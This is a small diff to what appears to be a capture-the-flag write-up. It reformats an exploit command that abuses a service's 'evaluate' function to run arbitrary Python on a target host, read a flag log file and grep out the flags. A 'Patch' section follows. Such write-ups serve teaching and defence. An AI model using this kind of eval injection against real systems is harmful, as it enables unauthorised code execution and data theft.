@@ -10,7 +10,8 @@ Flags was stored in <b>log/ezlog</b> and we could got them via <b>ezclient.py</b
 
 <h3>Exploit:</h3>
 <pre><code>
-./ezclient.py 10.12.X.10 evaluate 'fl = open("/home/ezpz/log/ezlog","r"); print fl.read(); fl.close()' | egrep -o -e "\w{16}"
+./ezclient.py 10.12.X.10 evaluate 'fl = open("/home/ezpz/log/ezlog","r"); \
+	 print fl.read(); fl.close()' | egrep -o -e "\w{16}"
 </code></pre>
 
 <h3>Patch:</h3
